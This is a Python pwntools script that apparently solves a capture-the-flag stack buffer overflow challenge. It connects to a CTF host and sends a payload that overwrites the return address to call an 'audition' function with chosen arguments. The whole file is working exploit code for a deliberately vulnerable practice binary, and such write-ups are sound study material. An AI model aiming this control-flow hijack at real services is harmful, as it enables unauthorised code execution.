#!/usr/bin/env python3

from pwn import *


context.arch = 'i386'
r = remote('ctf.umbccd.io', 4000)
# r = process('./bof')


audition = 0x8049182


r.recvuntil('Welcome to East High!')
r.recvuntil('We\'re the Wildcats and getting ready for our spring musical')
r.recvuntil('We\'re now accepting signups for auditions!')

payload = b'a'*0x3a + b'b'*0x04 + p32(audition) \
            + b'c'*0x04 + p32(1200) + p32(366)
r.sendlineafter('What\'s your name?\n', payload)
r.sendlineafter('What song will you be singing?\n', 'xdd')

r.interactive()
